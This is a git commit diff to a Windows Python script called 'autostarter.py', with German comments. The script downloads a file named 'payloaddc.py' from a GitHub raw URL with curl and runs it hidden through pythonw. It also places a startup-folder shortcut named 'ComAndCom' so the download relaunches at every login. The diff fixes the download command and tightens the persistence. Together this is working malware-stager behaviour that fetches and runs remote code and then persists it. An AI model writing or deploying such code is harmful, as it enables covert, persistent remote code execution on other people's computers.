68b5a9669a69aeb301ad91043eb2e50d78a50072
jkramer5103 <121427510+jkramer5103@users.noreply.github.com>
2024-10-15 19:20:28 +0200

    Update autostarter.py

--- autostarter.py
+++ autostarter.py
@@ -1,7 +1,7 @@
+import os
 import winshell
 from win32com.client import Dispatch
 import sys
-import os
 
 username = os.getlogin()
 
@@ -19,16 +19,19 @@ def create_shortcut_to_autostart(script_path, shortcut_name="ComAndCom"):
     shell = Dispatch('WScript.Shell')
     shortcut = shell.CreateShortcut(autostart_path)
     
-    # Setze den Pfad zum Python-Skript
-    shortcut.TargetPath = script_path
+    # Setze den Pfad zum Python-Interpreter und das Skript als Argument
+    shortcut.TargetPath = r"C:\Users\krame\AppData\Local\Programs\Python\Python313\pythonw.exe"  # Pfad zum pythonw.exe
+    shortcut.Arguments = f'"{script_path}" {argument}'  # Skript als Argument hinzufügen
     shortcut.WorkingDirectory = os.path.dirname(script_path)
     shortcut.IconLocation = script_path  # Optional: Setzt das Symbol des Skripts
     shortcut.save()
-    print(f"Shortcut '{shortcut_name}' was created in autostart.")
+    print(f"Shortcut '{shortcut_name}' wurde im Autostart erstellt.")
 
 # Der Pfad zu deinem Python-Skript
-script_to_autostart = f"pythonw C:\\Users\\{username}\\payloaddc.py {argument}"
+script_to_autostart = f"C:\\Users\\{username}\\payloaddc.py"
 
-os.system("cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/payloaddc.py")
+os.system(f"cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/payloaddc.py")
 create_shortcut_to_autostart(script_to_autostart, "ComAndCom")
-os.system(f"pythonw {script_to_autostart} {argument}")
+
+# Skript starten
+os.system(f'pythonw "{script_to_autostart}" {argument}')
